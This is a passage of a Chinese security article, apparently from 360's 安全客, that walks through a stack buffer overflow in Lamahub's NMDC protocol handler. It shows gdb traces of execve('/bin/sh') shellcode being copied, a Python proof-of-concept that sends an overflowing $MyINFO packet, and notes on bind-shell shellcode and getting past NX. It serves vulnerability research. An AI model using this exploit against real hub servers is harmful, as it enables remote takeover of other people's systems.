+ESP:&nbsp;0xbffff2c0&nbsp;--&gt;&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+EIP:&nbsp;0x805534a&nbsp;(&lt;proto_state_handler+410&gt;:call&nbsp;&nbsp;&nbsp;0x80539e0&nbsp;&lt;proto_nmdc_state_hello&gt;)
+EFLAGS:&nbsp;0x296&nbsp;(carry&nbsp;PARITY&nbsp;ADJUST&nbsp;zero&nbsp;SIGN&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)
+[-------------------------------------code-------------------------------------]
+&nbsp;&nbsp;&nbsp;0x805533b&nbsp;&lt;proto_state_handler+395&gt;:push&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[esp+0xdc]
+&nbsp;&nbsp;&nbsp;0x8055342&nbsp;&lt;proto_state_handler+402&gt;:push&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[esp+0xdc]
+&nbsp;&nbsp;&nbsp;0x8055349&nbsp;&lt;proto_state_handler+409&gt;:push&nbsp;&nbsp;&nbsp;ebx
+=&gt;&nbsp;0x805534a&nbsp;&lt;proto_state_handler+410&gt;:call&nbsp;&nbsp;&nbsp;0x80539e0&nbsp;&lt;proto_nmdc_state_hello&gt;
+&nbsp;&nbsp;&nbsp;0x805534f&nbsp;&lt;proto_state_handler+415&gt;:add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x10
+&nbsp;&nbsp;&nbsp;0x8055352&nbsp;&lt;proto_state_handler+418&gt;:add&nbsp;&nbsp;&nbsp;&nbsp;esp,0xc0
+&nbsp;&nbsp;&nbsp;0x8055358&nbsp;&lt;proto_state_handler+424&gt;:pop&nbsp;&nbsp;&nbsp;&nbsp;ebx
+&nbsp;&nbsp;&nbsp;0x8055359&nbsp;&lt;proto_state_handler+425&gt;:pop&nbsp;&nbsp;&nbsp;&nbsp;esi
+Guessed&nbsp;arguments:
+arg[0]:&nbsp;0x806c610&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c610)
+arg[1]:&nbsp;0x8062700&nbsp;(&quot;$MyINFO&nbsp;$ALL&nbsp;Pierre&nbsp;Je&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;30&nbsp;times&gt;,&nbsp;&quot;\061\300Ph//shh/bin\211\343\061?\312j\vX?&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;42&nbsp;times&gt;,&nbsp;&quot;a&lt;&lt;$My\200&quot;)
+arg[2]:&nbsp;0x144</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">进入之后会根据$MyINFO内部的内容进行一些处理。比如</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;n
+[----------------------------------registers-----------------------------------]
+EAX:&nbsp;0x13&nbsp;
+EBX:&nbsp;0x8062700&nbsp;(&quot;$MyINFO&nbsp;$ALL&nbsp;Pierre&nbsp;Je&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;30&nbsp;times&gt;,&nbsp;&quot;\061\300Ph//shh/bin\211\343\061?\312j\vX?&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;42&nbsp;times&gt;,&nbsp;&quot;a&lt;&lt;$My\200&quot;)
+ECX:&nbsp;0x7&nbsp;
+EDX:&nbsp;0x6&nbsp;
+ESI:&nbsp;0x8062702&nbsp;(&quot;yINFO&nbsp;$ALL&nbsp;Pierre&nbsp;Je&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;30&nbsp;times&gt;,&nbsp;&quot;\061\300Ph//shh/bin\211\343\061?\312j\vX?&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;42&nbsp;times&gt;,&nbsp;&quot;a&lt;&lt;$My\200&quot;)
+EDI:&nbsp;0x805ac4b&nbsp;(&quot;$MyINFO&quot;)
+EBP:&nbsp;0x0&nbsp;
+ESP:&nbsp;0xbfffefc0&nbsp;--&gt;&nbsp;0xbffff000&nbsp;--&gt;&nbsp;0xfbad8001&nbsp;
+EIP:&nbsp;0x8053a3d&nbsp;(&lt;proto_nmdc_state_hello+93&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;esi,ebx)
+EFLAGS:&nbsp;0x202&nbsp;(carry&nbsp;parity&nbsp;adjust&nbsp;zero&nbsp;sign&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)
+[-------------------------------------code-------------------------------------]
+&nbsp;&nbsp;&nbsp;0x8053a2d&nbsp;&lt;proto_nmdc_state_hello+77&gt;:jbe&nbsp;&nbsp;&nbsp;&nbsp;0x8053d20&nbsp;&lt;proto_nmdc_state_hello+832&gt;
+&nbsp;&nbsp;&nbsp;0x8053a33&nbsp;&lt;proto_nmdc_state_hello+83&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;ecx,0x7
+&nbsp;&nbsp;&nbsp;0x8053a38&nbsp;&lt;proto_nmdc_state_hello+88&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;edi,0x805ac4b
+=&gt;&nbsp;0x8053a3d&nbsp;&lt;proto_nmdc_state_hello+93&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;esi,ebx
+&nbsp;&nbsp;&nbsp;0x8053a3f&nbsp;&lt;proto_nmdc_state_hello+95&gt;:repz&nbsp;cmps&nbsp;BYTE&nbsp;PTR&nbsp;ds:[esi],BYTE&nbsp;PTR&nbsp;es:[edi]
+&nbsp;&nbsp;&nbsp;0x8053a41&nbsp;&lt;proto_nmdc_state_hello+97&gt;:seta&nbsp;&nbsp;&nbsp;cl
+&nbsp;&nbsp;&nbsp;0x8053a44&nbsp;&lt;proto_nmdc_state_hello+100&gt;:setb&nbsp;&nbsp;&nbsp;al
+&nbsp;&nbsp;&nbsp;0x8053a47&nbsp;&lt;proto_nmdc_state_hello+103&gt;:sub&nbsp;&nbsp;&nbsp;&nbsp;ecx,eax
+gdb-peda$&nbsp;n
+[----------------------------------registers-----------------------------------]
+EAX:&nbsp;0x13&nbsp;
+EBX:&nbsp;0x8062700&nbsp;(&quot;$MyINFO&nbsp;$ALL&nbsp;Pierre&nbsp;Je&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;30&nbsp;times&gt;,&nbsp;&quot;\061\300Ph//shh/bin\211\343\061?\312j\vX?&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;42&nbsp;times&gt;,&nbsp;&quot;a&lt;&lt;$My\200&quot;)
+ECX:&nbsp;0x7&nbsp;
+EDX:&nbsp;0x6&nbsp;
+ESI:&nbsp;0x8062700&nbsp;(&quot;$MyINFO&nbsp;$ALL&nbsp;Pierre&nbsp;Je&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;30&nbsp;times&gt;,&nbsp;&quot;\061\300Ph//shh/bin\211\343\061?\312j\vX?&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;42&nbsp;times&gt;,&nbsp;&quot;a&lt;&lt;$My\200&quot;)
+EDI:&nbsp;0x805ac4b&nbsp;(&quot;$MyINFO&quot;)
+EBP:&nbsp;0x0&nbsp;
+ESP:&nbsp;0xbfffefc0&nbsp;--&gt;&nbsp;0xbffff000&nbsp;--&gt;&nbsp;0xfbad8001&nbsp;
+EIP:&nbsp;0x8053a3f&nbsp;(&lt;proto_nmdc_state_hello+95&gt;:repz&nbsp;cmps&nbsp;BYTE&nbsp;PTR&nbsp;ds:[esi],BYTE&nbsp;PTR&nbsp;es:[edi])
+EFLAGS:&nbsp;0x202&nbsp;(carry&nbsp;parity&nbsp;adjust&nbsp;zero&nbsp;sign&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)
+[-------------------------------------code-------------------------------------]
+&nbsp;&nbsp;&nbsp;0x8053a33&nbsp;&lt;proto_nmdc_state_hello+83&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;ecx,0x7
+&nbsp;&nbsp;&nbsp;0x8053a38&nbsp;&lt;proto_nmdc_state_hello+88&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;edi,0x805ac4b
+&nbsp;&nbsp;&nbsp;0x8053a3d&nbsp;&lt;proto_nmdc_state_hello+93&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;esi,ebx
+=&gt;&nbsp;0x8053a3f&nbsp;&lt;proto_nmdc_state_hello+95&gt;:repz&nbsp;cmps&nbsp;BYTE&nbsp;PTR&nbsp;ds:[esi],BYTE&nbsp;PTR&nbsp;es:[edi]
+&nbsp;&nbsp;&nbsp;0x8053a41&nbsp;&lt;proto_nmdc_state_hello+97&gt;:seta&nbsp;&nbsp;&nbsp;cl
+&nbsp;&nbsp;&nbsp;0x8053a44&nbsp;&lt;proto_nmdc_state_hello+100&gt;:setb&nbsp;&nbsp;&nbsp;al
+&nbsp;&nbsp;&nbsp;0x8053a47&nbsp;&lt;proto_nmdc_state_hello+103&gt;:sub&nbsp;&nbsp;&nbsp;&nbsp;ecx,eax
+&nbsp;&nbsp;&nbsp;0x8053a49&nbsp;&lt;proto_nmdc_state_hello+105&gt;:movsx&nbsp;&nbsp;ebp,cl
+Legend:&nbsp;code,&nbsp;data,&nbsp;rodata,&nbsp;value
+0x08053a3f&nbsp;in&nbsp;proto_nmdc_state_hello&nbsp;()</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">上述代码部分对$MyINFO中的$Hello Pierre后的指令进行处理，在后面会对这个内容进行拷贝。接下来会进入漏洞触发的关键部分。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;c
+Continuing.
+[----------------------------------registers-----------------------------------]
+EAX:&nbsp;0x806c320&nbsp;--&gt;&nbsp;0x80670c0&nbsp;(0x0806c320)
+EBX:&nbsp;0x8062700&nbsp;(&quot;$MyINFO&nbsp;$ALL&nbsp;Pierre&nbsp;Je&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;30&nbsp;times&gt;,&nbsp;&quot;\061\300Ph//shh/bin\211\343\061?\312j\vX?&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;42&nbsp;times&gt;,&nbsp;&quot;a&lt;&lt;$My\200&quot;)
+ECX:&nbsp;0xb7e65000&nbsp;(&lt;__strncpy_sse2+3504&gt;:mov&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[edi],edx)
+EDX:&nbsp;0x144&nbsp;
+ESI:&nbsp;0xbffff1a0&nbsp;--&gt;&nbsp;0xbffff200&nbsp;--&gt;&nbsp;0x8048766&nbsp;(&quot;libc.so.6&quot;)
+EDI:&nbsp;0x1&nbsp;
+EBP:&nbsp;0x0&nbsp;
+ESP:&nbsp;0xbfffefb0&nbsp;--&gt;&nbsp;0xbffff1a0&nbsp;--&gt;&nbsp;0xbffff200&nbsp;--&gt;&nbsp;0x8048766&nbsp;(&quot;libc.so.6&quot;)
+EIP:&nbsp;0x8053f77&nbsp;(&lt;proto_nmdc_state_hello+1431&gt;:call&nbsp;&nbsp;&nbsp;0x8048df0&nbsp;&lt;memcpy@plt&gt;)
+EFLAGS:&nbsp;0x282&nbsp;(carry&nbsp;parity&nbsp;adjust&nbsp;zero&nbsp;SIGN&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)
+[-------------------------------------code-------------------------------------]
+&nbsp;&nbsp;&nbsp;0x8053f6e&nbsp;&lt;proto_nmdc_state_hello+1422&gt;:push&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[esp+0x30c]
+&nbsp;&nbsp;&nbsp;0x8053f75&nbsp;&lt;proto_nmdc_state_hello+1429&gt;:push&nbsp;&nbsp;&nbsp;ebx
+&nbsp;&nbsp;&nbsp;0x8053f76&nbsp;&lt;proto_nmdc_state_hello+1430&gt;:push&nbsp;&nbsp;&nbsp;esi
+=&gt;&nbsp;0x8053f77&nbsp;&lt;proto_nmdc_state_hello+1431&gt;:call&nbsp;&nbsp;&nbsp;0x8048df0&nbsp;&lt;memcpy@plt&gt;
+&nbsp;&nbsp;&nbsp;0x8053f7c&nbsp;&lt;proto_nmdc_state_hello+1436&gt;:add&nbsp;&nbsp;&nbsp;&nbsp;esp,0xc
+&nbsp;&nbsp;&nbsp;0x8053f7f&nbsp;&lt;proto_nmdc_state_hello+1439&gt;:push&nbsp;&nbsp;&nbsp;0x0
+&nbsp;&nbsp;&nbsp;0x8053f81&nbsp;&lt;proto_nmdc_state_hello+1441&gt;:push&nbsp;&nbsp;&nbsp;0x8
+&nbsp;&nbsp;&nbsp;0x8053f83&nbsp;&lt;proto_nmdc_state_hello+1443&gt;:push&nbsp;&nbsp;&nbsp;DWORD&nbsp;PTR&nbsp;[esp+0x30c]
+Guessed&nbsp;arguments:
+arg[0]:&nbsp;0xbffff1a0&nbsp;--&gt;&nbsp;0xbffff200&nbsp;--&gt;&nbsp;0x8048766&nbsp;(&quot;libc.so.6&quot;)
+arg[1]:&nbsp;0x8062700&nbsp;(&quot;$MyINFO&nbsp;$ALL&nbsp;Pierre&nbsp;Je&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;30&nbsp;times&gt;,&nbsp;&quot;\061\300Ph//shh/bin\211\343\061?\312j\vX?&quot;,&nbsp;&#39;\220&#39;&nbsp;&lt;repeats&nbsp;42&nbsp;times&gt;,&nbsp;&quot;a&lt;&lt;$My\200&quot;)
+arg[2]:&nbsp;0x144&nbsp;
+Breakpoint&nbsp;6,&nbsp;0x08053f77&nbsp;in&nbsp;proto_nmdc_state_hello&nbsp;()</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">memcpy会将整个畸形payload考入到缓冲区中，这个过程没有对payload的长度进行检查而是直接拷贝，可以看到从recv开始到memcpy都一直没有进行长度控制，接下来返回时。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">[-------------------------------------code-------------------------------------]
+&nbsp;&nbsp;&nbsp;0x8053d29&nbsp;&lt;proto_nmdc_state_hello+841&gt;:pop&nbsp;&nbsp;&nbsp;&nbsp;esi
+&nbsp;&nbsp;&nbsp;0x8053d2a&nbsp;&lt;proto_nmdc_state_hello+842&gt;:pop&nbsp;&nbsp;&nbsp;&nbsp;edi
+&nbsp;&nbsp;&nbsp;0x8053d2b&nbsp;&lt;proto_nmdc_state_hello+843&gt;:pop&nbsp;&nbsp;&nbsp;&nbsp;ebp
+=&gt;&nbsp;0x8053d2c&nbsp;&lt;proto_nmdc_state_hello+844&gt;:ret&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;0x8053d2d&nbsp;&lt;proto_nmdc_state_hello+845&gt;:lea&nbsp;&nbsp;&nbsp;&nbsp;esi,[esi+0x0]
+&nbsp;&nbsp;&nbsp;0x8053d30&nbsp;&lt;proto_nmdc_state_hello+848&gt;:add&nbsp;&nbsp;&nbsp;&nbsp;esp,0x2ec
+&nbsp;&nbsp;&nbsp;0x8053d36&nbsp;&lt;proto_nmdc_state_hello+854&gt;:xor&nbsp;&nbsp;&nbsp;&nbsp;ebp,ebp
+&nbsp;&nbsp;&nbsp;0x8053d38&nbsp;&lt;proto_nmdc_state_hello+856&gt;:pop&nbsp;&nbsp;&nbsp;&nbsp;ebx</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">由于缓冲区溢出，导致返回地址被覆盖，到达可控位置。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;n
+[-------------------------------------code-------------------------------------]
+&nbsp;&nbsp;&nbsp;0x8066a27&nbsp;&lt;buf+39&gt;:push&nbsp;&nbsp;&nbsp;esi
+&nbsp;&nbsp;&nbsp;0x8066a28&nbsp;&lt;buf+40&gt;:popa&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;0x8066a29&nbsp;&lt;buf+41&gt;:ins&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;PTR&nbsp;es:[edi],dx
+=&gt;&nbsp;0x8066a2a&nbsp;&lt;buf+42&gt;:imul&nbsp;&nbsp;&nbsp;esp,DWORD&nbsp;PTR&nbsp;[ecx+eiz*2+0x74],0x63694e65
+&nbsp;&nbsp;&nbsp;0x8066a32&nbsp;&lt;buf+50&gt;:imul&nbsp;&nbsp;&nbsp;esp,DWORD&nbsp;PTR&nbsp;[eax],0x50
+&nbsp;&nbsp;&nbsp;0x8066a35&nbsp;&lt;buf+53&gt;:imul&nbsp;&nbsp;&nbsp;esp,DWORD&nbsp;PTR&nbsp;[ebp+0x72],0x247c6572
+&nbsp;&nbsp;&nbsp;0x8066a3c&nbsp;&lt;buf+60&gt;:push&nbsp;&nbsp;&nbsp;esi
+&nbsp;&nbsp;&nbsp;0x8066a3d&nbsp;&lt;buf+61&gt;:outs&nbsp;&nbsp;&nbsp;dx,BYTE&nbsp;PTR&nbsp;gs:[esi]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">PoC构造到Exploit</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里提供一个可以引发崩溃的PoC：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:python;toolbar:false">import&nbsp;socket
+HOST&nbsp;=&nbsp;&#39;192.168.25.101&#39;
+PORT&nbsp;=&nbsp;4111
+s&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)
+s.connect((HOST,&nbsp;PORT))
+evil_buf&nbsp;=&nbsp;&quot;$Supports&nbsp;Usllo&nbsp;IP2&nbsp;earch&nbsp;ZPe0&nbsp;|$Keya|$ValidateNick&nbsp;Pierre|$Ven&nbsp;1,0091|$GetNickList|$MyINFO&nbsp;$ALL&nbsp;Pierre&nbsp;Je&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\x41&quot;*120
+evil_buf&nbsp;+=&nbsp;&quot;\x61\x3c&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\x3c\x24\x4d\x79\x80\x00\x35\x24\x70\x69\x24\x30&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\x24\x37\x37\x37\x37\x37\x37\x37\x37\x37\x37\x37&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\x37\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\xb1\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x41\x41\x41\x41&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\xd6\x26\x06\x08\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\xb1\xb1\xb1\xb1\x37\x37\x30\x2c\x49\x4e\x46\x4f&quot;
+evil_buf&nbsp;+=&nbsp;&quot;\x24\xca\xca\xca\xca\x20\x5a\x50\x65\x30\x20&quot;
+evil_buf&nbsp;+=&nbsp;&quot;&nbsp;|$Keya|&quot;
+print&nbsp;&quot;Send&nbsp;eIVL&nbsp;packet!\n&quot;
+#&nbsp;Send&nbsp;EVIL&nbsp;PACKET&nbsp;!
+s.sendall(evil_buf)
+print&nbsp;&quot;Send&nbsp;COmplete!\n&quot;
+s.close()</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里可以直接引发崩溃，崩溃位置在evil_buf中的41414141，实际上这个地址就是覆盖的返回地址，修改这个返回地址，并且加上shellcode之后，通过gdb观察，可以看到eip的跳转，但是由于Lamahub开启了NX，导致shellcode无法执行。</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01b8b40b52afb122e5.png" title="t01b669686b1880ffbd.png" alt="http://p6.qhimg.com/t01b669686b1880ffbd.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">本文主要是分析协议漏洞成因，因此我在编译Lamahub的时候在Makefile加入了-fno-stack-protector -z execstack，关闭Linux下的NX，这样就可以执行shellcode了，那么在实际攻防中，可以利用ROP gadget来绕过NX。另外我刚开始用了pwntools的shellcraft，最后想利用interactive函数来拿shell，但是后来发现shellcraft中有一个badchar /x24，这个badchar不好绕过，利用pwntools最新的encode方法也会提示无法绕过，因此换了一个shellcode，绑定/bin/sh到指定端口，完成利用。</span></p><p style="text-align: center;"><img src="http://p3.qhimg.com/t014dfa4b7d7a8bf641.png" title="t0127a9ce79dc8f5d78.png" alt="http://p7.qhimg.com/t0127a9ce79dc8f5d78.png"/></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/3095.html
+                </p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】从NMDC看简单协议漏洞分析 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3095" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment-none alarm-info bg-primary">无任何评论</div>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
